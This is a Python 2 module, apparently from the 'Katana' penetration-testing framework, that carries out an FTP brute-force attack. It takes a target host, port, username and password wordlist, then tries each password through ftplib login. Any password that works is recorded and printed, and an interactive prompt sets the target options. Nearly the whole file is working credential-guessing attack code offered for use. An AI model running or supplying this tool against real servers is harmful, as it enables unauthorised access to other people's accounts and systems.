# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# @KATANA                       #
# Module    : FTP Brute Force   #
# Script by : LeSZO ZerO        #
# Date      : 07/03/2015        #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                   #
from core.design import *       #
from core.Setting import *      #
from core import Errors         #
from core import help           #
from core import ping           #
import sys                      #
d=DESIGN()                      #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                     #
from lib.ftplib.ftplib import FTP
import time                     #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Default                       #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
defaulthost=LOCAL_IP
defaultport=FTP_PORT
defaultuser=USERNAME
defaultdicc=DITIONARY_PASSWORDS
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

def run(target,port,username,dictionary):
	global defaulthost,defaultport,defaultuser,defaultdicc
	defaulthost=target
	defaultport=port
	defaultuser=username
	defaultdicc=dictionary
	btftp(1)

def btftp(run):
	try:
		global defaulthost,defaultport,defaultuser,defaultdicc
		if run!=1:
			actions=raw_input(d.prompt("bt/ftp"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("target","yes","IP or DNS",defaulthost)
			d.descrip("port","no","Port of target",defaultport)
 			d.descrip("user","yes","Username",defaultuser)
 			d.descrip("dict_1","yes","Dictionary pass",defaultdicc)
			d.space()
			btftp(0)
		elif actions[0:10] == "set target":
			defaulthost=defaulthost.replace("http://", "")
			defaulthost=ping.update(defaulthost,actions,"target")
			d.change("target",defaulthost)
		elif actions[0:8] == "set port":
			defaultport=ping.update(defaultport,actions,"port")
			d.change("port",defaultport)
		elif actions[0:8] == "set user":
			defaultuser=ping.update(defaultuser,actions,"user")
			d.change("user",defaultuser)
		elif actions[0:10] == "set dict_1":
			defaultdicc=ping.update(defaultdicc,actions,"dict_1")
			d.change("dict_1",defaultdicc)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				ftp = FTP(defaulthost)
				if True:
					try:
						d.loading_file()
						try:
							with open(defaultdicc,'r') as passs:
								for ps in passs:
									ps=ps.replace("\n","")
									try:
										ftp.login(defaultuser,ps)
										if True:
											ping.save("BruteForceFTP",defaulthost,defaultport,defaultuser,ps)
											d.Success(defaultuser,ps)
											return 1
									except:
										print " "+Alr+" Checking ("+defaultuser+"="+ps+")"
						except:
							Errors.Errors(event=sys.exc_info()[0], info=defaultdicc)
					except:
						Errors.Errors(event=sys.exc_info()[0], info=False)
			except:
				Errors.Errors(event=sys.exc_info()[0], info=defaulthost+":"+defaultport)
		else:
			d.No_actions()
	except:
		Errors.Errors(event=sys.exc_info()[0], info=False)
	btftp(0)
